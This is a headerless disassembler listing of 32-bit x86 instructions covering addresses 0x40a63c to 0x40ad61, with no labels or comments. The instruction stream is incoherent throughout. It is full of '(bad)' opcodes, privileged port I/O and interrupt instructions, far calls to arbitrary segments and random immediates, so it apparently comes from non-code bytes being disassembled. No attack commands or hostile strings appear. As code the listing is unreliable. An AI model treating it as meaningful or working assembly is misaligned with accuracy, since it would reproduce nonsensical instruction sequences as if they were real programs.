  40a63c:	xchg   esp,eax
  40a63d:	mov    eax,ds:0x3a971eae
  40a642:	repz inc ebp
  40a644:	jb     0x40a695
  40a646:	out    0xe8,eax
  40a648:	mov    ebp,0xee99dcdc
  40a64d:	cmp    BYTE PTR [ebp+0x5dd22f6a],ch
  40a653:	stc    
  40a654:	dec    esi
  40a655:	cli    
  40a656:	leave  
  40a657:	stos   BYTE PTR es:[edi],al
  40a658:	xchg   ebp,eax
  40a659:	mov    dl,0x23
  40a65b:	lock int 0x12
  40a65e:	cmp    BYTE PTR [edx+0x63f8c],ah
  40a664:	xor    ah,BYTE PTR [ecx]
  40a666:	bndldx bnd3,[esp+eiz*4-0x5c4b3e3f]
  40a66e:	mov    eax,0x941b9d9a
  40a673:	add    BYTE PTR [edx-0x3d2d1df4],al
  40a679:	adc    eax,0xd6a1da
  40a67e:	ror    BYTE PTR [edx],1
  40a680:	pop    eax
  40a681:	pop    edx
  40a682:	jns    0x40a6ab
  40a684:	sub    ah,ah
  40a686:	out    dx,eax
  40a687:	out    dx,ax
  40a689:	out    0xb3,al
  40a68b:	mov    ecx,0xd11ed056
  40a690:	dec    esp
  40a691:	adc    dh,BYTE PTR [ecx+0x43]
  40a694:	mov    ds,WORD PTR [ecx+0x35c853df]
  40a69a:	cmp    al,0x9a
  40a69c:	(bad)  
  40a69d:	mov    esp,0x26808ccd
  40a6a2:	sbb    DWORD PTR [eax],ecx
  40a6a4:	je     0x40a6d2
  40a6a6:	push   edi
  40a6a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6a8:	call   ebp
  40a6aa:	mov    cl,0x46
  40a6ac:	cmp    al,0x3b
  40a6ae:	and    edx,DWORD PTR [ecx+0x559d7d3a]
  40a6b4:	dec    eax
  40a6b5:	and    al,0xc5
  40a6b7:	ror    bl,0x9d
  40a6ba:	jb     0x40a646
  40a6bc:	repnz push cs
  40a6be:	pop    ebp
  40a6bf:	xlat   BYTE PTR ds:[ebx]
  40a6c0:	and    al,0xc2
  40a6c2:	test   al,0x76
  40a6c4:	sub    BYTE PTR [edi],dh
  40a6c6:	loopne 0x40a6ce
  40a6c8:	pop    esi
  40a6c9:	sub    eax,0x202b5a0f
  40a6ce:	mul    bl
  40a6d0:	mov    ebx,0xeb845594
  40a6d5:	xor    eax,0xdd6d9893
  40a6da:	int    0x9c
  40a6dc:	dec    eax
  40a6dd:	rcr    DWORD PTR [ecx+esi*8+0x2ffab82f],cl
  40a6e4:	aad    0x40
  40a6e6:	sbb    al,0x66
  40a6e8:	sub    esi,DWORD PTR [eax+0x16c3e82d]
  40a6ee:	mov    edi,0x6d997b18
  40a6f3:	xor    edx,DWORD PTR [ebx]
  40a6f5:	add    BYTE PTR [eax-0x5a],ah
  40a6f8:	jl     0x40a752
  40a6fa:	daa    
  40a6fb:	daa    
  40a6fc:	popa   
  40a6fd:	xlat   BYTE PTR ds:[ebx]
  40a6fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6ff:	lods   al,BYTE PTR ds:[esi]
  40a700:	xchg   edi,eax
  40a701:	shl    DWORD PTR [edx],cl
  40a703:	mov    esp,0x573d7733
  40a708:	ins    DWORD PTR es:[edi],dx
  40a709:	add    BYTE PTR [edx-0x46],0xb4
  40a70d:	mov    esi,0xb199cfcf
  40a712:	sub    ch,BYTE PTR [ebp+ebx*8-0x3e]
  40a716:	fst    QWORD PTR [bx-0x6fe8]
  40a71b:	popf   
  40a71c:	nop
  40a71d:	scas   al,BYTE PTR es:[edi]
  40a71e:	enter  0x2d3c,0x11
  40a722:	and    DWORD PTR [esi],0xcf92065a
  40a728:	sub    ebp,DWORD PTR [ebp+ecx*8+0x7462aa71]
  40a72f:	lods   al,BYTE PTR ds:[esi]
  40a730:	xor    eax,0xea66e424
  40a735:	sub    cl,0x8f
  40a738:	jns    0x40a6f3
  40a73a:	add    BYTE PTR [esi-0x42],dh
  40a73d:	mov    bl,0x19
  40a73f:	aam    0x14
  40a741:	int    0x97
  40a743:	add    al,BYTE PTR [esi-0x54]
  40a746:	rcl    DWORD PTR [esi-0xc8a601],0xab
  40a74d:	adc    eax,0x58481909
  40a752:	stc    
  40a753:	pop    ds
  40a754:	into   
  40a755:	adc    al,0xc8
  40a757:	ins    BYTE PTR es:[edi],dx
  40a758:	in     al,dx
  40a759:	jno    0x40a75d
  40a75b:	inc    esi
  40a75c:	sbb    al,0x5f
  40a75e:	test   DWORD PTR [eax],esi
  40a760:	dec    edx
  40a761:	daa    
  40a762:	ins    DWORD PTR es:[edi],dx
  40a763:	mov    WORD PTR [ecx-0x56],ss
  40a766:	cmp    eax,DWORD PTR [edx-0x67]
  40a769:	outs   dx,BYTE PTR ds:[esi]
  40a76a:	fdivr  DWORD PTR ds:[edi-0x6036d7f]
  40a771:	sti    
  40a772:	jecxz  0x40a7de
  40a774:	jb     0x40a75a
  40a776:	es retf 
  40a778:	push   edx
  40a779:	icebp  
  40a77a:	out    0x8a,eax
  40a77c:	fidiv  DWORD PTR [edi*2-0x3459a4c7]
  40a783:	push   ecx
  40a784:	dec    edx
  40a785:	sub    al,0x5e
  40a787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a788:	cmp    esp,DWORD PTR [ebx-0x7e431695]
  40a78e:	sub    BYTE PTR ds:0xfef4aa56,cl
  40a794:	lahf   
  40a795:	sbb    al,0x91
  40a797:	pop    es
  40a798:	xor    DWORD PTR [ebx-0x2],edi
  40a79b:	cdq    
  40a79c:	ror    DWORD PTR [esi],0x33
  40a79f:	jp     0x40a7cd
  40a7a1:	xchg   ebp,eax
  40a7a2:	call   0xe179:0xe6a27e4d
  40a7a9:	inc    esp
  40a7aa:	repz sti 
  40a7ac:	sub    ch,BYTE PTR [eax+0x3f]
  40a7af:	or     DWORD PTR [edx],esi
  40a7b1:	std    
  40a7b2:	mov    bl,0xa5
  40a7b4:	xor    cl,ch
  40a7b6:	sar    BYTE PTR [edi+eax*1-0xdb278c1],0xa5
  40a7be:	sbb    BYTE PTR [edx-0x52881bd8],dh
  40a7c4:	cli    
  40a7c5:	retf   
  40a7c6:	add    BYTE PTR [ebx+0x30],al
  40a7c9:	adc    BYTE PTR [eax],ch
  40a7cb:	call   0x50452bd6
  40a7d0:	pop    ebp
  40a7d1:	lods   eax,DWORD PTR ds:[esi]
  40a7d2:	cli    
  40a7d3:	lock pop eax
  40a7d5:	mov    ecx,0x313efe83
  40a7da:	dec    esp
  40a7db:	test   eax,0xf5a269d3
  40a7e0:	dec    ecx
  40a7e1:	cli    
  40a7e2:	(bad)  
  40a7e3:	shl    ebx,cl
  40a7e5:	xchg   edx,eax
  40a7e6:	fsub   st,st(3)
  40a7e8:	cmp    ch,BYTE PTR [esi]
  40a7ea:	ins    DWORD PTR es:[edi],dx
  40a7eb:	push   ds
  40a7ec:	dec    edx
  40a7ed:	mov    DWORD PTR [eax+edi*4-0x71],eax
  40a7f1:	inc    ecx
  40a7f2:	fisubr WORD PTR [esi+ecx*4+0x3624efb2]
  40a7f9:	popf   
  40a7fa:	loope  0x40a7d1
  40a7fc:	pop    ds
  40a7fd:	push   es
  40a7fe:	inc    ecx
  40a7ff:	adc    esp,DWORD PTR [ecx]
  40a801:	mov    BYTE PTR [ebp+0xf],dl
  40a804:	inc    ebp
  40a805:	ss xchg edx,eax
  40a807:	cld    
  40a808:	mov    esi,0x751bf7cb
  40a80d:	and    dl,bl
  40a80f:	aam    0x7c
  40a811:	scas   eax,DWORD PTR es:[edi]
  40a812:	cmp    al,0xbb
  40a814:	pop    ds
  40a815:	push   ss
  40a816:	xchg   ebx,eax
  40a817:	in     al,dx
  40a818:	call   0x82f6:0x37ecd79d
  40a81f:	mov    DWORD PTR [edi+0x36],esp
  40a822:	mov    esp,0x13ea572
  40a827:	xchg   edx,eax
  40a828:	retf   
  40a829:	xchg   edi,eax
  40a82a:	jne    0x40a88a
  40a82c:	shl    BYTE PTR [ecx+0x4f],0x2d
  40a830:	jp     0x40a7f0
  40a832:	in     al,dx
  40a833:	bound  esp,QWORD PTR [ebx-0x7bd7e694]
  40a839:	mov    ebx,DWORD PTR [edx-0x80]
  40a83c:	sub    ch,bh
  40a83e:	test   DWORD PTR [edi+edi*1+0x58],ebp
  40a842:	add    ah,dl
  40a844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a845:	and    BYTE PTR [esi],cl
  40a847:	pop    ebp
  40a848:	ret    
  40a849:	out    0x5e,eax
  40a84b:	adc    bh,ch
  40a84d:	mov    eax,ds:0x7045e17f
  40a852:	jb     0x40a888
  40a854:	daa    
  40a855:	ss xchg esp,eax
  40a857:	ja     0x40a7e5
  40a859:	dec    ebp
  40a85a:	mov    BYTE PTR [edx],cl
  40a85c:	cmp    bl,0x1
  40a85f:	clc    
  40a860:	sbb    bh,BYTE PTR [ebx-0x372fcc99]
  40a866:	sahf   
  40a867:	add    al,0x93
  40a869:	jne    0x40a865
  40a86b:	js     0x40a81a
  40a86d:	jns    0x40a87f
  40a86f:	aam    0x3c
  40a871:	sbb    eax,DWORD PTR [eax]
  40a873:	add    eax,0x9770054
  40a878:	(bad)  
  40a87a:	bound  ebx,QWORD PTR [ebp-0x21f0e70d]
  40a880:	push   edi
  40a881:	fcomp  QWORD PTR [esi]
  40a883:	jp     0x40a8c2
  40a885:	mov    esi,DWORD PTR [ebx-0x2f]
  40a888:	fnstenv [ebx]
  40a88a:	xor    al,0x9a
  40a88c:	leave  
  40a88d:	int    0x31
  40a88f:	sub    DWORD PTR [edi+0x5b111050],0x93390608
  40a899:	mov    cl,BYTE PTR [ebx]
  40a89b:	repz scas eax,DWORD PTR es:[edi]
  40a89d:	push   0x67ddd24b
  40a8a2:	aam    0xaa
  40a8a4:	(bad)  
  40a8a5:	cld    
  40a8a6:	lock popf 
  40a8a8:	imul   edi,DWORD PTR [edx-0x17],0xffffff82
  40a8ac:	fiadd  DWORD PTR [esp+eax*2+0xba7260b]
  40a8b3:	lods   al,BYTE PTR ds:[esi]
  40a8b4:	xlat   BYTE PTR ds:[ebx]
  40a8b5:	stc    
  40a8b6:	xchg   edx,eax
  40a8b7:	inc    esp
  40a8b8:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8ba:	push   ebp
  40a8bb:	sbb    eax,DWORD PTR [eax+ebx*1]
  40a8be:	scas   al,BYTE PTR es:[edi]
  40a8bf:	mov    bh,ah
  40a8c1:	test   al,0xf8
  40a8c3:	hlt    
  40a8c4:	sub    al,0x5d
  40a8c6:	xchg   esp,eax
  40a8c7:	popf   
  40a8c8:	adc    ah,al
  40a8ca:	or     ebx,DWORD PTR [ebx]
  40a8cc:	call   0x9f100601
  40a8d1:	call   0x36af4f17
  40a8d6:	mov    al,ds:0x19a318ad
  40a8db:	mov    ds:0xc2c721bb,eax
  40a8e0:	inc    eax
  40a8e1:	and    BYTE PTR [ecx+edi*4+0x6fd56296],cl
  40a8e8:	(bad)  
  40a8e9:	cld    
  40a8ea:	inc    esp
  40a8eb:	loope  0x40a873
  40a8ed:	push   ds
  40a8ee:	sti    
  40a8ef:	mov    ebx,0x5d5abde0
  40a8f4:	mov    bh,0x99
  40a8f6:	dec    edx
  40a8f7:	loopne 0x40a8ca
  40a8f9:	loop   0x40a978
  40a8fb:	ror    BYTE PTR [edx+ebx*2-0x7c],cl
  40a8ff:	or     eax,0x5b1e68e0
  40a904:	cwde   
  40a905:	inc    edi
  40a906:	and    al,0x1e
  40a908:	pusha  
  40a909:	jg     0x40a96a
  40a90b:	mov    WORD PTR [esi],cs
  40a90d:	mov    bl,0x24
  40a90f:	add    BYTE PTR [ecx+0xb2773f0],ch
  40a915:	jb     0x40a91c
  40a917:	add    al,0xbd
  40a919:	outs   dx,BYTE PTR ds:[esi]
  40a91a:	jno    0x40a971
  40a91c:	lods   eax,DWORD PTR ds:[esi]
  40a91d:	mov    edi,0x83f5f6b4
  40a922:	stc    
  40a923:	aaa    
  40a924:	lock fdivr QWORD PTR [edx+0x34]
  40a928:	jecxz  0x40a95f
  40a92a:	sbb    BYTE PTR ds:0x6565bac7,al
  40a930:	je     0x40a92b
  40a932:	cmp    al,0x4f
  40a934:	mov    ds,ebp
  40a936:	inc    ebp
  40a937:	dec    edx
  40a938:	push   es
  40a939:	push   cs
  40a93a:	stos   DWORD PTR es:[edi],eax
  40a93b:	adc    DWORD PTR [ecx],edx
  40a93d:	pop    esp
  40a93e:	std    
  40a93f:	ret    
  40a940:	sahf   
  40a941:	mov    ch,0x99
  40a943:	mov    ah,BYTE PTR [edi+edi*2+0xe]
  40a947:	mov    eax,DWORD PTR [ebx]
  40a949:	pop    ecx
  40a94a:	dec    esp
  40a94b:	add    eax,0xe9dfbcc0
  40a950:	sbb    BYTE PTR ds:0xf1579bbd,bh
  40a956:	cmp    bl,BYTE PTR [ebp-0x70]
  40a959:	call   0x519d7aff
  40a95e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a95f:	pop    eax
  40a960:	sbb    eax,0xff3524cb
  40a965:	mov    cl,0x11
  40a967:	dec    eax
  40a968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a969:	push   ecx
  40a96a:	sbb    edx,eax
  40a96c:	adc    ebx,edi
  40a96e:	pop    es
  40a96f:	aam    0x1
  40a971:	add    al,al
  40a973:	out    0x68,al
  40a975:	mov    DWORD PTR [esi],ecx
  40a977:	push   edi
  40a978:	push   es
  40a979:	imul   esi,DWORD PTR fs:[ecx+0x4a757557],0x5d
  40a981:	int3   
  40a982:	stos   DWORD PTR es:[edi],eax
  40a983:	xor    dl,BYTE PTR [ebx]
  40a985:	mov    ah,0x93
  40a987:	xchg   esp,eax
  40a988:	pop    ss
  40a989:	in     al,0xb0
  40a98b:	jle    0x40a97b
  40a98d:	stos   DWORD PTR es:[edi],eax
  40a98e:	cmc    
  40a98f:	cmp    BYTE PTR ds:0xa8abeefd,cl
  40a995:	rep outs dx,DWORD PTR ds:[esi]
  40a997:	sahf   
  40a998:	mov    ds:0xee16d6cf,al
  40a99d:	push   ss
  40a99e:	sbb    eax,0x50db2916
  40a9a3:	add    DWORD PTR [edx-0x78536aed],eax
  40a9a9:	or     cl,BYTE PTR [edx+0x0]
  40a9ac:	sub    eax,DWORD PTR [esi]
  40a9ae:	fisub  DWORD PTR [ebp-0x3841ce2c]
  40a9b4:	not    BYTE PTR [ebp+0x27]
  40a9b7:	xchg   esi,edx
  40a9b9:	mov    esi,edi
  40a9bb:	jle    0x40a9a6
  40a9bd:	mov    al,ds:0x58b418de
  40a9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9c3:	xchg   ebp,eax
  40a9c4:	mov    DWORD PTR [eax],ebp
  40a9c6:	lods   eax,DWORD PTR ds:[esi]
  40a9c7:	dec    esi
  40a9c8:	mov    ah,0xd3
  40a9ca:	fsubr  DWORD PTR [ecx-0x4546a5d7]
  40a9d0:	(bad)  
  40a9d1:	dec    esi
  40a9d2:	in     eax,0xaa
  40a9d4:	push   esp
  40a9d5:	adc    DWORD PTR [bx+si-0x5e],ebp
  40a9d9:	jo     0x40a961
  40a9db:	push   es
  40a9dc:	bound  ebp,QWORD PTR [ebx]
  40a9de:	sbb    ch,BYTE PTR [ebx]
  40a9e0:	aas    
  40a9e1:	test   al,0xe3
  40a9e3:	mov    WORD PTR [edi-0x2f],cs
  40a9e6:	dec    ecx
  40a9e7:	(bad)  
  40a9e8:	cmp    bl,BYTE PTR [eax-0x589df007]
  40a9ee:	xchg   edi,eax
  40a9ef:	sbb    edi,DWORD PTR fs:[ebp+0x64]
  40a9f3:	aad    0xf9
  40a9f5:	push   edx
  40a9f6:	xor    cl,dl
  40a9f8:	das    
  40a9f9:	xchg   ebp,eax
  40a9fa:	imul   ebx,DWORD PTR ds:0x7b97134b,0xf7cf3a45
  40aa04:	sbb    dl,BYTE PTR [ebx]
  40aa06:	ds dec ebp
  40aa08:	rep ins DWORD PTR es:[edi],dx
  40aa0a:	add    BYTE PTR [esi],dh
  40aa0c:	and    esp,DWORD PTR [ebx+ebx*4-0x8]
  40aa10:	neg    BYTE PTR [ebx+0x31]
  40aa13:	jge    0x40aa2d
  40aa15:	add    eax,0xfb16c3fb
  40aa1a:	xor    DWORD PTR [esi+0x65e42712],0xffffffff
  40aa21:	ss js  0x40aa01
  40aa24:	push   esi
  40aa25:	xchg   dl,cl
  40aa27:	push   esi
  40aa28:	in     al,0x37
  40aa2a:	jns    0x40aa31
  40aa2c:	lea    edi,ds:0xb37e26cd
  40aa32:	imul   ebp,DWORD PTR [esi],0xffffffd5
  40aa35:	push   ds
  40aa36:	popa   
  40aa37:	jg     0x40aa58
  40aa39:	add    al,0xc4
  40aa3b:	inc    si
  40aa3d:	inc    eax
  40aa3e:	and    al,0xf7
  40aa40:	aam    0xbd
  40aa42:	xchg   edx,eax
  40aa43:	test   BYTE PTR [ebx-0x59],dh
  40aa46:	and    ebp,ebp
  40aa48:	je     0x40aa7e
  40aa4a:	inc    edx
  40aa4b:	mov    dl,0xa7
  40aa4d:	push   ds
  40aa4e:	push   esi
  40aa4f:	les    esi,FWORD PTR [edi+edi*1+0x3a7d93ab]
  40aa56:	gs xchg ebx,eax
  40aa58:	push   eax
  40aa59:	mov    cl,0xf6
  40aa5b:	and    edx,DWORD PTR [esi]
  40aa5d:	test   BYTE PTR [edi+0x44],dl
  40aa60:	pop    eax
  40aa61:	ror    BYTE PTR [edi-0x3d],0xdf
  40aa65:	scas   eax,DWORD PTR es:[edi]
  40aa66:	lea    eax,[ecx+0x1b94d620]
  40aa6c:	scas   al,BYTE PTR es:[edi]
  40aa6d:	sar    BYTE PTR [esi],0x6d
  40aa70:	sbb    DWORD PTR [edi-0x5b],eax
  40aa73:	test   al,0x60
  40aa75:	add    DWORD PTR [eax],edx
  40aa77:	jnp    0x40aaca
  40aa79:	and    BYTE PTR [edx-0x43],ch
  40aa7c:	xor    BYTE PTR [edx+eax*1+0x139c0a00],dh
  40aa83:	push   es
  40aa84:	push   es
  40aa85:	popa   
  40aa86:	iret   
  40aa87:	ds inc edx
  40aa89:	sub    dl,BYTE PTR [eax]
  40aa8b:	or     BYTE PTR [ebx+0x19ae8ca1],bl
  40aa91:	nop
  40aa92:	lea    esi,[ebx-0x3b]
  40aa95:	lahf   
  40aa96:	out    dx,eax
  40aa97:	stos   DWORD PTR es:[edi],eax
  40aa98:	and    al,0x66
  40aa9a:	sbb    DWORD PTR [ebx],esp
  40aa9c:	pop    edi
  40aa9d:	adc    eax,0x9512353f
  40aaa2:	add    DWORD PTR [eax],eax
  40aaa4:	dec    edi
  40aaa5:	add    esp,ecx
  40aaa7:	push   esi
  40aaa8:	push   edi
  40aaa9:	ins    DWORD PTR es:[edi],dx
  40aaaa:	inc    ecx
  40aaab:	mov    es,WORD PTR [ecx+eiz*1-0x2c]
  40aaaf:	or     DWORD PTR [eax-0x72],eax
  40aab2:	add    dl,al
  40aab4:	cmp    DWORD PTR [ebp+0x6],0xffffff80
  40aab8:	(bad)  ds:0x11ed800
  40aabe:	mov    esp,0xc00342bf
  40aac3:	out    0x6b,eax
  40aac5:	lods   eax,DWORD PTR ds:[esi]
  40aac6:	inc    ebx
  40aac7:	mov    eax,ds:0x28573cd
  40aacc:	add    BYTE PTR [ecx+0x38],dl
  40aacf:	mov    dl,0x5d
  40aad1:	jecxz  0x40ab33
  40aad3:	jae    0x40ab24
  40aad5:	mov    ch,0x7d
  40aad7:	icebp  
  40aad8:	xor    BYTE PTR [ebx+0x1feef8e9],cl
  40aade:	sbb    DWORD PTR [ebp-0x1b51c899],ecx
  40aae4:	push   ebp
  40aae5:	ds dec edi
  40aae7:	outs   dx,DWORD PTR ds:[esi]
  40aae8:	sbb    BYTE PTR [eax-0x62856630],cl
  40aaee:	dec    esi
  40aaef:	rep stos BYTE PTR es:[edi],al
  40aaf1:	mov    ebp,0xab44a672
  40aaf6:	cmp    bl,BYTE PTR [ecx]
  40aaf8:	leave  
  40aaf9:	pop    es
  40aafa:	push   ebp
  40aafb:	or     DWORD PTR [esp+ebx*1+0x2f],esp
  40aaff:	scas   eax,DWORD PTR es:[edi]
  40ab00:	mov    ebx,edx
  40ab02:	shl    DWORD PTR [edi],0xf3
  40ab05:	mov    ah,0xb2
  40ab07:	mov    edi,0x2963544
  40ab0c:	push   cs
  40ab0d:	mov    edx,?
  40ab0f:	adc    BYTE PTR [edi],dl
  40ab11:	jl     0x40ab2d
  40ab13:	sub    BYTE PTR [esi],dl
  40ab15:	mov    fs:0x8be6ef87,eax
  40ab1b:	hlt    
  40ab1c:	add    DWORD PTR [eax-0x1],ebx
  40ab1f:	popf   
  40ab20:	aad    0x52
  40ab22:	xor    eax,0xd041ae06
  40ab27:	cmp    ch,BYTE PTR [edi-0x7e]
  40ab2a:	fisub  WORD PTR [edx]
  40ab2c:	jle    0x40ab8d
  40ab2e:	jg     0x40ab31
  40ab30:	repz fild DWORD PTR [ebx-0x55074bb3]
  40ab37:	addr16 dec edi
  40ab39:	add    dh,BYTE PTR [ebx-0x7fe67a46]
  40ab3f:	ret    0xfe44
  40ab42:	and    BYTE PTR [ebx-0x6749c549],dh
  40ab48:	sbb    dh,BYTE PTR [eax-0x4cf5cfec]
  40ab4e:	or     eax,DWORD PTR [ecx+ebx*4]
  40ab51:	fimul  WORD PTR [ebx]
  40ab53:	stc    
  40ab54:	sbb    al,0x6
  40ab56:	or     dh,dh
  40ab58:	fs ins DWORD PTR es:[edi],dx
  40ab5a:	jbe    0x40ab2b
  40ab5c:	xor    BYTE PTR [ecx],dl
  40ab5e:	cmp    BYTE PTR [edx+esi*1+0x8],cl
  40ab62:	dec    dh
  40ab64:	out    dx,al
  40ab65:	xchg   DWORD PTR ds:0x922c40c9,eax
  40ab6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab6c:	sti    
  40ab6d:	mov    ebx,0xc613bb25
  40ab72:	shl    BYTE PTR [ecx-0x42da84a1],0xed
  40ab79:	dec    ebx
  40ab7a:	daa    
  40ab7b:	inc    ebp
  40ab7c:	pop    ebp
  40ab7d:	inc    esp
  40ab7e:	je     0x40ab9c
  40ab80:	add    BYTE PTR [eax],al
  40ab82:	mov    ah,0xa1
  40ab84:	fist   WORD PTR [ebp-0x56e2afb3]
  40ab8a:	xchg   esi,eax
  40ab8b:	pop    ebx
  40ab8c:	xchg   edx,eax
  40ab8d:	rcr    BYTE PTR [edi],0x84
  40ab90:	(bad)  
  40ab91:	and    bl,al
  40ab93:	and    eax,0x6416aaee
  40ab98:	std    
  40ab99:	mov    ecx,0xcaf08cd6
  40ab9e:	mov    DWORD PTR ds:0xb92b3e46,ecx
  40aba4:	repz cmc 
  40aba6:	mov    BYTE PTR [esi-0x67b19960],0x79
  40abad:	bound  esi,QWORD PTR [edi-0x49a7b01]
  40abb3:	imul   edx,ebp,0x8054cd07
  40abb9:	mov    al,0x50
  40abbb:	jo     0x40ac38
  40abbd:	fadd   QWORD PTR [edi-0xc]
  40abc0:	addr16 xchg ecx,eax
  40abc2:	jp     0x40ac0d
  40abc4:	test   eax,0xec1edf00
  40abc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abca:	outs   dx,DWORD PTR ds:[esi]
  40abcb:	jne    0x40ac05
  40abcd:	xchg   edx,eax
  40abce:	sub    DWORD PTR [ebx+0x582778d2],ecx
  40abd4:	add    eax,0xe6b76988
  40abd9:	cmp    al,0x30
  40abdb:	cwde   
  40abdc:	ja     0x40ac1b
  40abde:	pop    edi
  40abdf:	aam    0xa2
  40abe1:	jge    0x40ab8b
  40abe3:	call   0x140d:0x9d4bf6ec
  40abea:	dec    ebp
  40abeb:	sbb    eax,0x1a884c1e
  40abf0:	mov    al,0xd6
  40abf2:	cmp    ebp,DWORD PTR [ecx]
  40abf4:	sti    
  40abf5:	adc    dl,cl
  40abf7:	(bad)  
  40abf8:	mov    eax,0x46fe6d3a
  40abfd:	inc    DWORD PTR ds:[esi]
  40ac00:	pop    esi
  40ac01:	and    BYTE PTR [edi-0x3],bl
  40ac04:	dec    ebx
  40ac05:	pop    ebx
  40ac06:	test   al,0xf3
  40ac08:	inc    BYTE PTR [ebx-0x43d2b08c]
  40ac0e:	push   0x56
  40ac10:	xor    BYTE PTR [edx+0x76],dl
  40ac13:	push   ds
  40ac14:	add    al,bl
  40ac16:	unpcklps xmm3,XMMWORD PTR [eax+eiz*8+0x2e6bb878]
  40ac1e:	mov    bl,dl
  40ac20:	mov    fs,edx
  40ac22:	mov    WORD PTR [eax],ds
  40ac24:	jae    0x40abf0
  40ac26:	ficomp DWORD PTR [ebx]
  40ac28:	push   eax
  40ac29:	jle    0x40ac00
  40ac2b:	push   0xfffffffa
  40ac2d:	cmp    ah,BYTE PTR [ebx-0xe]
  40ac30:	test   esi,ecx
  40ac32:	and    al,0xd
  40ac34:	inc    esi
  40ac35:	fld    TBYTE PTR [ecx+0x7f]
  40ac38:	outs   dx,BYTE PTR ds:[esi]
  40ac39:	xchg   esi,eax
  40ac3a:	(bad)  
  40ac3b:	or     al,0xd5
  40ac3d:	imul   esi,DWORD PTR [eax+0x5a],0x29ac0305
  40ac44:	out    0x65,eax
  40ac46:	inc    edi
  40ac47:	push   ebp
  40ac48:	adc    al,0x46
  40ac4a:	add    BYTE PTR [edi-0x60],0x30
  40ac4e:	pop    ebx
  40ac4f:	adc    dh,BYTE PTR [edi]
  40ac51:	loopne 0x40ac22
  40ac53:	or     eax,0x23dee996
  40ac58:	ins    DWORD PTR es:[edi],dx
  40ac59:	adc    bh,dh
  40ac5b:	jnp    0x40acaa
  40ac5d:	outs   dx,DWORD PTR ds:[esi]
  40ac5e:	cmp    edi,DWORD PTR [ecx+0x602e001a]
  40ac64:	pop    ebp
  40ac65:	loope  0x40ac06
  40ac67:	ficom  DWORD PTR [ebx]
  40ac69:	push   edx
  40ac6a:	xor    al,0x2
  40ac6c:	je     0x40acec
  40ac6e:	outs   dx,BYTE PTR ds:[esi]
  40ac6f:	pushf  
  40ac70:	ficom  WORD PTR [esi+0x1b]
  40ac73:	pop    ss
  40ac74:	out    dx,eax
  40ac75:	add    esi,esp
  40ac77:	push   ds
  40ac78:	call   0xdc69b3b9
  40ac7d:	fimul  DWORD PTR [ebx-0x7f]
  40ac80:	mov    ?,WORD PTR [ecx+ecx*8-0x518f8b48]
  40ac87:	mov    ebp,0xd5d061ff
  40ac8c:	pop    ss
  40ac8d:	mov    dh,0xb2
  40ac8f:	cdq    
  40ac90:	iret   
  40ac91:	ror    DWORD PTR [ecx+0x3c70bf6e],0xed
  40ac98:	sub    BYTE PTR [ebx+0x7],bh
  40ac9b:	scas   al,BYTE PTR es:[edi]
  40ac9c:	(bad)  
  40ac9e:	mov    ds:0xfb7290b6,eax
  40aca3:	jnp    0x40ac4d
  40aca5:	scas   eax,DWORD PTR es:[edi]
  40aca6:	pop    edx
  40aca7:	outs   dx,DWORD PTR es:[esi]
  40aca9:	mov    edx,0xd5755342
  40acae:	aad    0xf0
  40acb0:	mov    DWORD PTR [edi+0x59],esp
  40acb3:	sub    al,0x4e
  40acb5:	(bad)  
  40acb6:	cmc    
  40acb7:	mov    ebx,0xe95c69b9
  40acbc:	mov    eax,0xd8deb66e
  40acc1:	cmp    al,0x3
  40acc3:	outs   dx,DWORD PTR fs:[esi]
  40acc5:	jl     0x40ad30
  40acc7:	push   es
  40acc8:	mov    esp,0x1995475f
  40accd:	cli    
  40acce:	push   ebx
  40accf:	stos   DWORD PTR es:[edi],eax
  40acd0:	pop    ds
  40acd1:	call   0x520d:0xe7c1be89
  40acd8:	mov    bl,0x15
  40acda:	shl    BYTE PTR [esi+0x39c85396],1
  40ace0:	jbe    0x40aca1
  40ace2:	sbb    BYTE PTR [ecx-0x1232f48f],cl
  40ace8:	mov    ds:0x5d4d9af3,al
  40aced:	xor    al,0x7a
  40acef:	jp     0x40ad47
  40acf1:	cmp    al,0x1
  40acf3:	xchg   ebx,eax
  40acf4:	push   edi
  40acf5:	scas   al,BYTE PTR es:[edi]
  40acf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acf7:	fistp  QWORD PTR [edx-0x735b5b19]
  40acfd:	psllw  mm0,mm4
  40ad00:	out    dx,al
  40ad01:	adc    BYTE PTR [ecx+0x61824677],dl
  40ad07:	mov    al,0x23
  40ad09:	nop
  40ad0a:	test   eax,0xe9eea524
  40ad0f:	mov    esi,DWORD PTR [ecx-0x6ce57bf4]
  40ad15:	clc    
  40ad16:	or     eax,0x8295df4
  40ad1b:	retf   0x3bbf
  40ad1e:	retf   0xf120
  40ad21:	pop    ss
  40ad22:	sahf   
  40ad23:	sub    cl,BYTE PTR [ebx]
  40ad25:	(bad)  
  40ad26:	sub    BYTE PTR ds:0x7337858c,ch
  40ad2c:	mov    ds:0xe8833d9,eax
  40ad31:	fld    QWORD PTR [esp+edi*4+0x6f]
  40ad35:	push   es
  40ad36:	jp     0x40ad99
  40ad38:	jge    0x40ad4e
  40ad3a:	data16 xor BYTE PTR [edi],dh
  40ad3d:	sub    al,BYTE PTR [eax+0x36]
  40ad40:	fiadd  DWORD PTR [ebx+0x77]
  40ad43:	idiv   BYTE PTR [eax]
  40ad45:	push   edx
  40ad46:	cli    
  40ad47:	dec    esi
  40ad48:	jbe    0x40ad09
  40ad4a:	bound  eax,QWORD PTR [eax]
  40ad4c:	sbb    ah,dl
  40ad4e:	sbb    esp,DWORD PTR [eax-0x5096b472]
  40ad54:	cmp    bl,BYTE PTR ds:0xb39e291
  40ad5a:	out    dx,eax
  40ad5b:	or     ah,BYTE PTR [ebx]
  40ad5d:	and    BYTE PTR [edx-0x7e],dl
  40ad60:	push   ecx
  40ad61:	jns    0x40ad2e
